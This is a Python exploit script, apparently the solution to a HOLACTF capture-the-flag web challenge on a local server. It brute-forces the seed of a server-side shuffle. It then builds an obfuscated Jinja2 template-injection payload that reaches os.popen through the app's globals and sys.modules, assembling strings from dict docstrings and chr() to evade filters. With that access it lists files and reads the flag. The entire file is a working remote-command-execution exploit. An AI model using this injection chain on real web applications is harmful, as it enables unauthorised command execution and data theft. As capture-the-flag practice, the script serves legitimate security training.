import requests
import random
import re

URL="http://127.0.0.1:54551/"
MAX_SEED=50


def bruteforce_seed(url):
	print("[*] Send test payload.")

	endpoint="/api/cast_attack?attack_name="

	sample_payload="0123456789abcdef_"


	response = requests.get(url+endpoint+sample_payload)

	index_called = response.text.find("name ")
		
	if index_called != -1:
		sample_result = response.text[index_called:index_called+len(sample_payload)+7]
		print(f"Response: {sample_result}")
	else:
		print("Not found response.")
		exit()

	print("[*] Bruteforce seed.")

	def random_with_seed(template, seed):  
		random.seed(seed) 
		char_list = list(template)
		random.shuffle(char_list)
		template = ''.join(char_list)
		return template

	for i in range(0,MAX_SEED+1):
		test_result=random_with_seed(sample_payload, i)
		if(test_result in sample_result):
			true_seed=i
			print(f"Found shuffle seed: {true_seed}")
			return true_seed
		if i==MAX_SEED+1:
			print("Not found valid seed")
			exit()

def find_original_string_from_target(target_text, seed_value):
	random.seed(seed_value)
	indices = list(range(len(target_text)))
	random.shuffle(indices)
	
	original_list = [''] * len(target_text)
	for i, index in enumerate(indices):
		original_list[index] = target_text[i]
		
	original_text = ''.join(original_list)
	return original_text, indices

def create_magic_payload_by_doc(CMD):
	true_story={}.__doc__
	sample="{}.__doc__"
	result=""
	for j in range(len(CMD)):
		for i in range(len(true_story)):
			if CMD[j]==true_story[i]:
				if j==0:
					result+=f"{sample}[{i}].__add__("
				elif j==len(CMD)-1:
					result+=f"{sample}[{i}])"
				else:
					result+=f"{sample}[{i}]).__add__("
				break
			if CMD[j]!=true_story[i] and i==(len(true_story)-1):
				print(f"Letter {CMD[j]} not exist")
				break
	return result

def create_magic_payload_by_chr(CMD):
	result=""
	sample=f"app.__init__.__globals__[{create_magic_payload_by_doc('sys')}].modules[{create_magic_payload_by_doc('builtins')}]"
	for i in range(len(CMD)):
		if i == 0:
			result += sample+f".chr({ord(CMD[i])}).__add__("
		elif i == len(CMD)-1:
			result += sample+f".chr({ord(CMD[i])}))"
		else:
			result += sample+f".chr({ord(CMD[i])})).__add__("
	print(f"[+] Result of {CMD}: {result}")
	return result
	
def execute_cmd(url, seed, cmd, pattern):
	"""Pattern must be the regex of the thing you want to find"""
	print(f"[*] Create payload of {cmd}")

	target_text = "{{app.__init__.__globals__["+create_magic_payload_by_doc('sys')+"].modules["+create_magic_payload_by_doc('os')+"].popen("+create_magic_payload_by_chr(cmd)+").read()}}"    
	print(target_text)
	seed_value = seed     
	original_text, indices = find_original_string_from_target(target_text, seed_value)
	cmd_payload=original_text
	print("[+] Target payload:", target_text)          
	print("[+] Payload:", original_text)            

	print(f"[*] Execute {cmd}.")

	endpoint="/api/cast_attack?attack_name="
	response = requests.get(url+endpoint+cmd_payload)

	matches = re.findall(pattern, str(response.text))
	if matches==[]:
		print("Failed to fetch flag")
		print(response.text)
		exit()
	print(f"[+] Result is: {matches[0]}")
	return matches[0]

if __name__ == "__main__":
	# Step 1: Get seed
	seed = bruteforce_seed(URL)
	# Step 2: Execute ls to find flag file
	flag_file = execute_cmd(URL, seed, "ls | grep 'flag'", r"flag_.*\.txt")
	# Step 3: Get flag
	flag = execute_cmd(URL, seed, f"cat {flag_file}", r"HOLACTF\{[^}]+\}")


